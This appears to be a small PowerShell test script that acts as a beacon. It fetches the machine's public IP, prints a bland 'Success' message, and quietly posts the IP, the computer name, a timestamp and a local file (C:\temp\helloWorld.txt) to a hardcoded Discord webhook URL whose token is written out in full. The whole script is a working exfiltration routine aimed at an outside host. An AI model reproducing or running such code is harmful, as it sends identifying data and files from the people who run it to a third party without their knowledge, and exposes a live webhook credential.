$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
$IP = Invoke-WebRequest("ifconfig.me")
$cTime = Get-Date -Format "MM/dd - HH:mm:ss"

Write-Output "Success"

$msg = @{
    content = "test.ps has been run with IP $IP at $cTime."
    username = $Env:ComputerName
    file = Get-Item -Path "C:\temp\helloWorld.txt"
} | ConvertTo-Json

Invoke-WebRequest -Uri $URL -Method Post -Body $msg -ContentType "multipart/form-data" | Out-Null
